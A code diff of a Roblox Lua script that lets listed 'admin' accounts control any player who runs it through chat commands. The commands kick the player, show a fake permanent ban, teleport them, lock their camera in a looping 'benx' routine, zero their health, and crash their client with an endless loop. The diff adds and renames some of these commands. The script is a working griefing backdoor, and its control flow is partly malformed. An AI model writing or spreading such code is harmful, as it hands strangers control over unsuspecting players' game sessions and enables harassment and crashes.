@@ -2,7 +2,10 @@
 game.players["kreepozi"].Character.Humanoid.DisplayName = "[👑]67kreepoz"
 game.players["vepiuu"].Character.Humanoid.DisplayName = "[👑]codive"
 
---Admins
+
+
+
+--Admin
 local moder = {
     admin = "vepiuu",
     admin = "KreepOZi",
@@ -23,11 +26,14 @@ spawn(function()
             --- kick 
         if cht:match(prefix .. "kick " .. game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer:Kick("You have been kicked")
+            --- fake ban
+        elseif cht:match(prefix .. "ban " .. game.Players.LocalPlayer.Name) then
+            game.Players.LocalPlayer:Kick("User PERMA BANNED")
              --- brings
         elseif cht:match(prefix .. "bring " .. game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
              --- benx 
-        elseif cht:match(prefix .. "b " .. game.Players.LocalPlayer.Name) then
+        elseif cht:match(prefix .. "benx " .. game.Players.LocalPlayer.Name) then
             game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = admin.Character.HumanoidRootPart
             local benxed = true
             while benxed == true do
@@ -55,12 +61,6 @@ spawn(function()
              --- reset 
             elseif cht:match(prefix .. "reset " .. game.Players.LocalPlayer.Name) then
                 game.Players.LocalPlayer.Character.Humanoid.Health = 0
-            --- fake ban 
-        if cht:match(prefix .. "ban " .. game.Players.LocalPlayer.Name) then
-            game.Players.LocalPlayer:Kick("User BANNED")
-            --- fake ban 
-        if cht:match(prefix .. "pban " .. game.Players.LocalPlayer.Name) then
-            game.Players.LocalPlayer:Kick("PERMA BANNED")
              --- crash a player
             elseif cht:match(prefix .. "crash " .. game.Players.LocalPlayer.Name) then
             while true do
